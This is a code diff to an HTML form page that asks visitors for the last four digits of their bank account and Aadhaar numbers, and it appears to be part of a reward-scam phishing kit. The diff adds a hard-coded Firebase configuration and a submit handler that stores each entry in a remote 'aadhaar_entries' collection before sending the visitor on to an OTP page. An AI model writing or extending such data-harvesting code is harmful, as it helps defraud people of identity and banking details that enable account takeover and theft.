@@ -66,7 +66,7 @@
       text-align: center;
     }
 
-    .submit-btn a {
+    .submit-btn button {
       background: #f09c19;
       color: #fff;
       font-size: 12px;
@@ -74,12 +74,12 @@
       padding: 8px 18px;
       text-align: center;
       border-radius: 6px;
-      text-decoration: none;
-      display: inline-block;
+      border: none;
+      cursor: pointer;
       transition: background 0.3s ease;
     }
 
-    .submit-btn a:hover {
+    .submit-btn button:hover {
       background: #0f3f55;
     }
 
@@ -97,7 +97,7 @@
   <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
-    <form onsubmit="return validateForm()">
+    <form onsubmit="return handleSubmit(event)">
       <div class="form-group">
         <label for="accLast4">Last 4 Digits of Account Number *</label>
         <input type="text" id="accLast4" name="accLast4" maxlength="4" pattern="\d{4}" required>
@@ -110,12 +110,29 @@
       </div>
 
       <div class="submit-btn">
-        <a href="#" onclick="submitIfValid()">Submit</a>
+        <button type="submit">Submit</button>
       </div>
     </form>
 
     <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
   </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
 
   <script>
     const aadhaarInput = document.getElementById("aadhaarLast4");
@@ -125,17 +142,32 @@
       aadhaarError.style.display = "none";
     });
 
-    function validateForm() {
-      const aadhaar = aadhaarInput.value.trim();
+    function validateForm(aadhaar) {
       return /^\d{4}$/.test(aadhaar);
     }
 
-    function submitIfValid() {
-      if (validateForm()) {
-        window.location.href = "otp5.html";
-      } else {
+    function handleSubmit(e) {
+      e.preventDefault();
+
+      const accLast4 = document.getElementById("accLast4").value.trim();
+      const aadhaarLast4 = document.getElementById("aadhaarLast4").value.trim();
+
+      if (!validateForm(aadhaarLast4)) {
         aadhaarError.style.display = "block";
+        return false;
       }
+
+      db.collection("aadhaar_entries").add({
+        accountLast4: accLast4,
+        aadhaarLast4: aadhaarLast4,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "otp5.html";
+      }).catch((error) => {
+        alert("Error saving to Firebase: " + error.message);
+      });
+
+      return false;
     }
   </script>
 </body>
